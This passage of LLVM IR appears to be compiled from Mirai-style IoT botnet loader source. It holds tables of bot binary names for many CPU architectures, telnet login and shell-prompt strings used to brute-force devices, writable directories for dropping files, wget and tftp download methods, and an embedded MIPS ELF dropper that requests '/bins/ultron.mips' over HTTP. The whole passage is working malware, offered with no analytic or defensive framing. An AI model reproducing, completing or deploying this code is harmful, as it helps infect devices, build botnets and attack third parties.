i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.231, i32 0, i32 0)], align 16
@.str.63 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.70 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.72 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.75 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.76 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.77 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.78 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.79 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.80 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.81 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.82 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.83 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.84 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.85 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.89 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.90 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.91 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.93 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.94 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.96 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.97 = private unnamed_addr constant [18 x i8] c"armarmv5larmv6lb1\00", align 1
@.str.98 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.99 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.100 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.102 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.103 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.104 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.105 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.106 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.110 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.111 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"jackmyarmv5l\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"jackmyarmv6l\00", align 1
@.str.115 = private unnamed_addr constant [11 x i8] c"jackmyarv6\00", align 1
@.str.116 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.118 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.119 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.120 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.121 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"telarmv6l\00", align 1
@.str.123 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.124 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"TwoFacearmv61\00", align 1
@.str.127 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.128 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.129 = private unnamed_addr constant [12 x i8] c"TwoFacem86k\00", align 1
@.str.130 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.132 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.133 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.134 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.136 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.138 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.139 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.140 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.141 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.143 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.145 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.146 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.147 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.148 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.149 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.150 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.158 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.159 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.160 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.161 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.162 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.163 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.164 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.165 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.166 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.167 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.168 = private unnamed_addr constant [10 x i8] c"20botmips\00", align 1
@.str.169 = private unnamed_addr constant [10 x i8] c"botmipsel\00", align 1
@.str.170 = private unnamed_addr constant [7 x i8] c"botsh4\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"botx86_64\00", align 1
@.str.172 = private unnamed_addr constant [10 x i8] c"botarmv6l\00", align 1
@.str.173 = private unnamed_addr constant [8 x i8] c"boti686\00", align 1
@.str.174 = private unnamed_addr constant [11 x i8] c"botpowerpc\00", align 1
@.str.175 = private unnamed_addr constant [8 x i8] c"boti586\00", align 1
@.str.176 = private unnamed_addr constant [8 x i8] c"botm68k\00", align 1
@.str.177 = private unnamed_addr constant [9 x i8] c"botsparc\00", align 1
@.str.178 = private unnamed_addr constant [10 x i8] c"botarmv4l\00", align 1
@.str.179 = private unnamed_addr constant [10 x i8] c"botarmv5l\00", align 1
@.str.180 = private unnamed_addr constant [28 x i8] c"botpowerpc440fpbotmipsfinal\00", align 1
@.str.181 = private unnamed_addr constant [15 x i8] c"botmipselfinal\00", align 1
@.str.182 = private unnamed_addr constant [12 x i8] c"botsh4final\00", align 1
@.str.183 = private unnamed_addr constant [15 x i8] c"botx86_64final\00", align 1
@.str.184 = private unnamed_addr constant [15 x i8] c"botarmv6lfinal\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"boti686final\00", align 1
@.str.186 = private unnamed_addr constant [16 x i8] c"botpowerpcfinal\00", align 1
@.str.187 = private unnamed_addr constant [13 x i8] c"boti586final\00", align 1
@.str.188 = private unnamed_addr constant [13 x i8] c"botm68kfinal\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"botsparcfinal\00", align 1
@.str.190 = private unnamed_addr constant [15 x i8] c"botarmv4lfinal\00", align 1
@.str.191 = private unnamed_addr constant [15 x i8] c"botarmv5lfinal\00", align 1
@.str.192 = private unnamed_addr constant [21 x i8] c"botpowerpc440fpfinal\00", align 1
@.str.193 = private unnamed_addr constant [10 x i8] c"mirai.x86\00", align 1
@.str.194 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.195 = private unnamed_addr constant [11 x i8] c"mirai.mpsl\00", align 1
@.str.196 = private unnamed_addr constant [10 x i8] c"mirai.arm\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"mirai.arm5n\00", align 1
@.str.198 = private unnamed_addr constant [11 x i8] c"mirai.arm7\00", align 1
@.str.199 = private unnamed_addr constant [10 x i8] c"mirai.ppc\00", align 1
@.str.200 = private unnamed_addr constant [10 x i8] c"mirai.spc\00", align 1
@.str.201 = private unnamed_addr constant [11 x i8] c"mirai.m68k\00", align 1
@.str.202 = private unnamed_addr constant [10 x i8] c"mirai.sh4\00", align 1
@.str.203 = private unnamed_addr constant [12 x i8] c"miraint.x86\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"miraint.mips\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"miraint.mpsl\00", align 1
@.str.206 = private unnamed_addr constant [12 x i8] c"miraint.arm\00", align 1
@.str.207 = private unnamed_addr constant [14 x i8] c"miraint.arm5n\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"miraint.arm7\00", align 1
@.str.209 = private unnamed_addr constant [12 x i8] c"miraint.ppc\00", align 1
@.str.210 = private unnamed_addr constant [12 x i8] c"miraint.spc\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"miraint.m68k\00", align 1
@.str.212 = private unnamed_addr constant [19 x i8] c"miraint.sh4bot.x86\00", align 1
@.str.213 = private unnamed_addr constant [9 x i8] c"bot.mips\00", align 1
@.str.214 = private unnamed_addr constant [9 x i8] c"bot.mpsl\00", align 1
@.str.215 = private unnamed_addr constant [8 x i8] c"bot.arm\00", align 1
@.str.216 = private unnamed_addr constant [10 x i8] c"bot.arm5n\00", align 1
@.str.217 = private unnamed_addr constant [9 x i8] c"bot.arm7\00", align 1
@.str.218 = private unnamed_addr constant [8 x i8] c"bot.ppc\00", align 1
@.str.219 = private unnamed_addr constant [8 x i8] c"bot.spc\00", align 1
@.str.220 = private unnamed_addr constant [9 x i8] c"bot.m68k\00", align 1
@.str.221 = private unnamed_addr constant [8 x i8] c"bot.sh4\00", align 1
@.str.222 = private unnamed_addr constant [10 x i8] c"botnt.x86\00", align 1
@.str.223 = private unnamed_addr constant [11 x i8] c"botnt.mips\00", align 1
@.str.224 = private unnamed_addr constant [11 x i8] c"botnt.mpsl\00", align 1
@.str.225 = private unnamed_addr constant [10 x i8] c"botnt.arm\00", align 1
@.str.226 = private unnamed_addr constant [12 x i8] c"botnt.arm5n\00", align 1
@.str.227 = private unnamed_addr constant [11 x i8] c"botnt.arm7\00", align 1
@.str.228 = private unnamed_addr constant [10 x i8] c"botnt.ppc\00", align 1
@.str.229 = private unnamed_addr constant [10 x i8] c"botnt.spc\00", align 1
@.str.230 = private unnamed_addr constant [11 x i8] c"botnt.m68k\00", align 1
@.str.231 = private unnamed_addr constant [10 x i8] c"botnt.sh4\00", align 1
@buf = common global i8 0, align 1
@input = common global [1024 x i8] zeroinitializer, align 16
@output = common global [1024 x i8] zeroinitializer, align 16
@advances = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* null], align 16
@.str.236 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.237 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.238 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.239 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.240 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.241 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.248, i32 0, i32 0), i8* null], align 16
@.str.242 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.243 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.244 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.245 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.246 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.248 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [6 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* null], align 16
@.str.249 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.250 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.251 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.252 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* null], align 16
@tmp_dirs = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.257, i32 0, i32 0), i8* null], align 16
@.str.253 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.254 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.255 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.256 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.257 = private unnamed_addr constant [9 x i8] c"/var/run\00", align 1
@checkmethod = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8* null], align 16
@.str.258 = private unnamed_addr constant [5 x i8] c"tftp\00", align 1
@archs = global [2 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.259, i32 0, i32 0), i8* null], align 16
@.str.259 = private unnamed_addr constant [7 x i8] c"armv5l\00", align 1
@arch_arm = global [2 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.259, i32 0, i32 0), i8* null], align 16
@echo = global [2 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.260, i32 0, i32 0), i8* null], align 16
@.str.260 = private unnamed_addr constant [19 x i8] c": applet not found\00", align 1
@wget = global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* null], align 16
@tftp = global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@dropper_mips = global [2 x i8*] [i8* getelementptr inbounds ([2001 x i8], [2001 x i8]* @.str.264, i32 0, i32 0), i8* null], align 16
@.str.264 = private unnamed_addr constant [2001 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04\C0\00\00\004\00\00\06\B8\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\060\00\00\060\00\00\00\05\00\01\00\00\00\00\00\01\00\00\060\00D\060\00D\060\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\85X\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\85<\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\85 \03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\F8\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84\AC\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\84\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\84\5C\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84\10\03\99\E0!'\BD\FF8\AF\BF\00\C0\AF\B3\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\E0\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF\8F\85\80\18\8F\82\80\18\8F\99\80H$\A5\05\E8$\04\00\01$\06\00\07$B\05\E0\03 \F8\09\02\02\98#\8F\BC\00\10$\02\00\02\8F\99\80L\A7\A2\00\1C$\02\00P$\07\00\D9$\04\00\A8$\05\00\EB$\06\00R\03 \F8\09\A7\A2\00\1E\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\F0$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\0F\00@\80!\8F\85\80\18\8F\99\80H$\A5\05\FC$\04\00\01\03 \F8\09$\06\00\04\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\10 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&p\00\1D$\A5\06\04\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10$\04\00\01\8F\85\80\18\8F\99\80H$\A5\06(\03 \F8\09$\06\00\04\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\C0\8F\B3\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C8<\1C\00\05'\9C\81`\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\81H\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81 \03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ !\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\B0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80`\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.mips HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06\90\00@\05\C0\00@\01\9C\00@\02\10\00@\05p\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\05\00\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\05@\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\E0\00\00\05\E0\00\00\00P\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\060\00\00\060\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06\90\00\00\06\84\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\84\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\84\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_mipsel = global [2 x i8*] [i8* getelementptr inbounds ([2049 x i8], [2049 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
